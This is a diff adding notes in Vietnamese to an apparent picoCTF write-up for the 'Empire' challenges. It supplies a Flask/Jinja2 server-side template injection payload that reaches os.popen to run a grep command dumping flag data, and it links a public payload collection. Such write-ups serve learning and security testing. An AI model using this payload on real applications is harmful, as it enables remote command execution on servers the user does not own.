@@ -8,6 +8,16 @@
   
 - Về các lỗi mà người ra đề đưa ra mình sẽ tổng hợp 1 cách chi tiết nhất có thể nếu có thời gian
 
+- Về phần câu Empire 1 nếu có thời gian mình sẽ giải lại theo cách hay hơn
+
+- Về phần câu Empire 2 và 3 có cách nhanh hơn là dump data trực tiếp. Tuy nhiên cần nhiều kiến thức về flask. Các bạn có thể thử các payload này
+
+- Payload Empire 2: `{{ [].__class__.__base__.__subclasses__()[93].__init__.__globals__["sys"].modules["os"].popen("grep -RI pico .").read() }}`
+
+- Payload Empire 3: `{{ [].__class__.__base__.__subclasses__()[93].__init__.__globals__["sys"].modules["os"].popen("grep -RI pico .").read() }}`
+
+- 2 payload này đều như nhau đó là dump data trực tiếp nhờ tìm kiếm bằng grep thông qua module *sys* và *os* của python. Có thể đây là sơ hở của đề. Ngoài ra payload để dump data trực tiếp còn rất nhiều, có thể tham khảo trong link này: [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
 ---
 ### Mục lục
 
